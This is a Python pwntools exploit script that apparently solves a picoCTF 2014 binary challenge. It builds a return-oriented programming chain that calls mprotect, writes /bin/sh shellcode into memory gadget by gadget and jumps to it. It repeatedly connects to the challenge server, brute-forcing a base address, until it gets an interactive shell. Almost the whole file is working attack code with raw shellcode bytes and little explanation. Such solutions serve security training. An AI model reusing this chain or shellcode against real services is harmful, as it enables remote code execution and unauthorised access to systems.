
from re import match
import struct


from pwn import *
import re, sys

#offset
data_addr = 0x0f000000

mov_eax_edx = 0x00000c91 # mov eax, edx ; ret
mov_p_eax_edx = 0x000010cf #mov dword ptr [eax], edx ; or eax, 0xffffffff ; ret
pop_ebx_edx = 0x00000efb #pop edx ; pop ebx ; pop esi ; ret
int_0x80 = 0x00000726 #int 0x80
xor_eax_eax = 0x000010f2 # xor eax, eax ; ret

mprotect_addr = 0x00000828

#conn = remote('localhost',1337)

shell = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

# for gdb
#base_addr_s =raw_input()
#base_addr = int(base_addr_s, 16)
base_addr = 0xf77a3000
print hex(base_addr)
count = 0

while 1:
	count += 1
	print "[+]"+str(count)
	conn = remote('nttvuln2014.picoctf.com',4000)
#	conn = remote('localhost',1337)
	line = conn.recvuntil('yo, what\'s up?')
	print line
#	sleep(5)
	conn.send("1000")
	line = conn.recvuntil('ROP time!')
	print line

	cmd ='A'*32



	cmd += struct.pack('<I', base_addr + mprotect_addr)
	cmd += struct.pack('<I', base_addr+pop_ebx_edx)
	cmd += struct.pack('<I', 0x0000a000)
	cmd += struct.pack('<I', 0x00000007)

	# /bin -> data_addr

	for i in xrange(6):

		cmd += struct.pack("<I", base_addr+pop_ebx_edx)
		cmd += struct.pack("<I", data_addr+i*4)
		cmd += struct.pack("<I", 0x41414141)
		cmd += struct.pack("<I", 0x41414141)
		cmd += struct.pack("<I", base_addr+mov_eax_edx)

		cmd += struct.pack("<I", base_addr+pop_ebx_edx)
		shell_part = shell[i*4:(i+1)*4]
		cmd += struct.pack(">I", int(shell_part.encode('hex'),16))
#		print hex(int(shell_part.encode('hex'),16))
		cmd += struct.pack("<I", 0x41414141)
		cmd += struct.pack("<I", 0x41414141)
		cmd += struct.pack("<I", base_addr+mov_p_eax_edx)


	cmd += struct.pack("<I", data_addr)
#	sleep(5)
	conn.send(cmd+"\n")
#	sleep(10)
	line = conn.recv()

	print line


	line = conn.send("ls\n")
	try:
		line = conn.recv(timeout=1)
	except:
		print "except"
		conn.close()
		continue


	if line =='':
		print "True"
	else:
		conn.interactive()

	conn.close()
